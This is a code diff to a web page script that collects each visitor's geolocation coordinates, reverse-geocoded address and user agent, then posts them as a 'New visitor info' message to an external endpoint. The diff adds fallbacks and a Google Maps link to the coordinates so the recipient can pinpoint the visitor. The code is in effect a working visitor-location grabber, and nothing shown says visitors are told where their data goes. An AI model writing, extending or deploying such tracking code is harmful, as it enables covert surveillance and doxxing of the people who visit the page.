@@ -40,9 +40,14 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        content: `New visitor info:\nIP: ${ip}\nAddress: ${address}\nUser Agent: ${userAgent}\nVPN: ${isVPN ? 'Yes' : 'No'}\nCoordinates: ${coordinates}`,
+                        content: `New visitor info:\nIP: ${ip || 'N/A'}\nAddress: ${address || 'N/A'}\nUser Agent: ${userAgent}\nVPN: ${isVPN ? 'Yes' : 'No'}\nCoordinates: ${coordinates}\nGoogle Maps Link: ${getGoogleMapsLink(coordinates)}`,
                     }),
                 });
+            };
+
+            // Function to get Google Maps link with coordinates
+            const getGoogleMapsLink = (coordinates) => {
+                return `https://www.google.com/maps?q=${coordinates}`;
             };
 
             // Function to get visitor's information including coordinates
@@ -57,8 +62,8 @@
                     const infoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`);
                     const infoData = await infoResponse.json();
 
-                    const ip = 'N/A'; // Unfortunately, you can't retrieve the IP directly from the client-side
-                    const address = `${infoData.address.city}, ${infoData.address.state}, ${infoData.address.country}`;
+                    const ip = 'N/A'; // Unfortunately, you can't reliably retrieve the IP directly from the client-side
+                    const address = `${infoData.address.city || 'N/A'}, ${infoData.address.state || 'N/A'}, ${infoData.address.country || 'N/A'}`;
                     const userAgent = navigator.userAgent;
                     const isVPN = false; // It's not possible to reliably determine VPN usage client-side
 
